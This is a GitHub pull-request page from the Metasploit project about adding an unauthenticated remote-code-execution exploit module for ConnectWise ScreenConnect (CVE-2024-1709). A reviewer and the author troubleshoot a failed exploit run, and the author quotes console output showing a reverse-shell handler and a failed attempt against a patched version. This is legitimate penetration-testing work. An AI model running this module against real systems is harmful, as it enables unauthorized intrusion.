[Feb 23, 2024](https://github.com/rapid7/metasploit-framework/pull/18870#event-11907427070)
34 checks passed

[![@jheysel-r7](https://avatars.githubusercontent.com/u/23320005?s=40&v=4)](/jheysel-r7)
[jheysel-r7](/jheysel-r7)
added
the
[rn-modules](/rapid7/metasploit-framework/labels/rn-modules)
release notes for new or majorly enhanced modules
label
[Feb 23, 2024](#event-11907428661)

[![@jheysel-r7](https://avatars.githubusercontent.com/u/23320005?s=80&v=4)](/jheysel-r7)

Copy link

Contributor

### **[jheysel-r7](/jheysel-r7)** commented [Feb 23, 2024](#issuecomment-1961874500)

| Release Notes This PR add an unauthenticated RCE exploit for ConnectWise ScreenConnect ([CVE-2024-1709](https://github.com/advisories/GHSA-cg3j-75xh-7fv3 "CVE-2024-1709")). |
| --- |

All reactions

Sorry, something went wrong.

[![canders-crwd](https://avatars.githubusercontent.com/u/160273670?s=60&v=4)](/canders-crwd)

**[canders-crwd](/canders-crwd)**
reviewed
[Feb 28, 2024](#pullrequestreview-1906969365)

 [View reviewed changes](/rapid7/metasploit-framework/pull/18870/files/d7a0dee7d1f6c94fb2534e5ebcc96edf1fb85a03)

Copy link

### @canders-crwd **[canders-crwd](/canders-crwd)** left a comment ‚Ä¢ edited Loading

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

I've been unable to successfully complete the exploit due to the following error: "Unexpected reply after attempting to login with admin credentials." Any troubleshooting ideas?

[![Screenshot 2024-02-28 at 10 22 31‚ÄØAM](https://private-user-images.githubusercontent.com/160273670/308669871-cd3fe39c-dd2f-42e5-b623-63118f3e591e.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NTc3OTAsIm5iZiI6MTczNjU1NzQ5MCwicGF0aCI6Ii8xNjAyNzM2NzAvMzA4NjY5ODcxLWNkM2ZlMzljLWRkMmYtNDJlNS1iNjIzLTYzMTE4ZjNlNTkxZS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTExJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMVQwMTA0NTBaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0xODg5OTJhOWRmMmIxNDQyMDliMWIyMDg4OGU4N2Y2YTA4NzkxNDRmMDE3MWRhNzdjMzA2Yzk0Y2FiOTUxYzEwJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.LZPWxiwTep7ZzUOz1dvgDqmbcN8kOTDg3X2QfNKcvtw)](https://private-user-images.githubusercontent.com/160273670/308669871-cd3fe39c-dd2f-42e5-b623-63118f3e591e.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NTc3OTAsIm5iZiI6MTczNjU1NzQ5MCwicGF0aCI6Ii8xNjAyNzM2NzAvMzA4NjY5ODcxLWNkM2ZlMzljLWRkMmYtNDJlNS1iNjIzLTYzMTE4ZjNlNTkxZS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTExJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMVQwMTA0NTBaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0xODg5OTJhOWRmMmIxNDQyMDliMWIyMDg4OGU4N2Y2YTA4NzkxNDRmMDE3MWRhNzdjMzA2Yzk0Y2FiOTUxYzEwJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.LZPWxiwTep7ZzUOz1dvgDqmbcN8kOTDg3X2QfNKcvtw)

The only difference I can find in my approach is that I have not been able to login to <http://127.0.0.1:8040/> because I can't find the trial license key to paste. However, I am successfully logged into the <https://username.screenconnect.com/Host#Support/All%20Sessions> console. Any suggestions would be greatly appreciated, thank you!

[![Screenshot 2024-02-28 at 10 29 58‚ÄØAM](https://private-user-images.githubusercontent.com/160273670/308671915-c1415967-4505-412c-88fa-103c04928171.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NTc3OTAsIm5iZiI6MTczNjU1NzQ5MCwicGF0aCI6Ii8xNjAyNzM2NzAvMzA4NjcxOTE1LWMxNDE1OTY3LTQ1MDUtNDEyYy04OGZhLTEwM2MwNDkyODE3MS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTExJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMVQwMTA0NTBaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0yNzUxZmQ1MzliZjFkMTQ3MTlkYjczZGEwNzc1ZTgzYTgwODE4YzRhMTViYTNjNjllOTVhZWNjNWVhOTQ2MjA3JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.ofMSPztCh5HyGUUDYdmGgWAvAai-omkSDW20HNjjE1A)](https://private-user-images.githubusercontent.com/160273670/308671915-c1415967-4505-412c-88fa-103c04928171.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NTc3OTAsIm5iZiI6MTczNjU1NzQ5MCwicGF0aCI6Ii8xNjAyNzM2NzAvMzA4NjcxOTE1LWMxNDE1OTY3LTQ1MDUtNDEyYy04OGZhLTEwM2MwNDkyODE3MS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTExJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMVQwMTA0NTBaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0yNzUxZmQ1MzliZjFkMTQ3MTlkYjczZGEwNzc1ZTgzYTgwODE4YzRhMTViYTNjNjllOTVhZWNjNWVhOTQ2MjA3JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.ofMSPztCh5HyGUUDYdmGgWAvAai-omkSDW20HNjjE1A)

Sorry, something went wrong.

All reactions

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=80&u=f52d9d3dd72c1a2c3d8ebb15de11fbea576daa81&v=4)](/sfewer-r7)

Copy link

Contributor

Author

### **[sfewer-r7](/sfewer-r7)** commented [Feb 29, 2024](#issuecomment-1970727946)

| Hi [@canders-crwd](https://github.com/canders-crwd)  I tested `ScreenConnect_23.8.8.8818_Release.msi` (SHA1: `28d2ef64957a9034f694b93789e947e0b5b04201`) and as per [@rad10](https://github.com/rad10) comment above, it appears ConnectWise have backported the patch to 23.\* versions, so exploitation fails if you are targeting an install from these backported versions:  ``` msf6 exploit(multi/http/connectwise_screenconnect_rce_cve_2024_1709) > exploit  [*] Started reverse TCP handler on 192.168.86.42:4444  [*] Running automatic check ("set AutoCheck false" to disable) [+] The target appears to be vulnerable. ConnectWise ScreenConnect 23.8.8 running on Windows. [-] Exploit aborted due to failure: unexpected-reply: Unexpected reply when initiating setup wizard. [*] Exploit completed, but no session was created.  ```  However I think what you are seeing is slightly different from this, your console output shows that an account is created but cannot be used. I expect this is due to the target server being unlicensed. |
| --- |

 üëç
1
 canders-crwd reacted with thumbs up emoji

All reactions

* üëç
  1 reaction

Sorry, something went wrong.

 [![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=40&u=f52d9d3dd72c1a2c3d8ebb15de11fbea576daa81&v=4)](/sfewer-r7)
[sfewer-r7](/sfewer-r7)
deleted the
connectwise-screenconnect-rce

branch
[July 4, 2024 08:59](#event-13391686845)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F18870)

Reviewers

[![@canders-crwd](https://avatars.githubusercontent.com/u/160273670?s=40&v=4)](/canders-crwd) [canders-crwd](/canders-crwd)

canders-crwd left review comments

[![@adfoster-r7](https://avatars.githubusercontent.com/u/60357436?s=40&v=4)](/adfoster-r7) [adfoster-r7](/adfoster-r7)

adfoster-r7 left review comments

[![@jheysel-r7](https://avatars.githubusercontent.com/u/23320005?s=40&v=4)](/jheysel-r7) [jheysel-r7](/jheysel-r7)

jheysel-r7 left review comments

Assignees

[![@jheysel-r7](https://avatars.githubusercontent.com/u/23320005?s=40&v=4)](/jheysel-r7) [jheysel-r7](/jheysel-r7)

Labels

[docs](/rapid7/metasploit-framework/labels/docs)
[module](/rapid7/metasploit-framework/labels/module)
[rn-modules](/rapid7/metasploit-framework/labels/rn-modules)
release notes for new or majorly enhanced modules

Projects

[Metasploit Kanban](/orgs/rapid7/projects/17)

Archived in project

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

7 participants

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=52&v=4)](/sfewer-r7) [![@brosjsy](https://avatars.githubusercontent.com/u/97712446?s=52&v=4)](/brosjsy) [![@iagox86](https://avatars.githubusercontent.com/u/526412?s=52&v=4)](/iagox86) [![@rad10](https://avatars.githubusercontent.com/u/11878508?s=52&v=4)](/rad10) [![@jheysel-r7](https://avatars.githubusercontent.com/u/23320005?s=52&v=4)](/jheysel-r7) [![@adfoster-r7](https://avatars.githubusercontent.com/u/60357436?s=52&v=4)](/adfoster-r7) [![@canders-crwd](https://avatars.githubusercontent.com/u/160273670?s=52&v=4)](/canders-crwd)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.

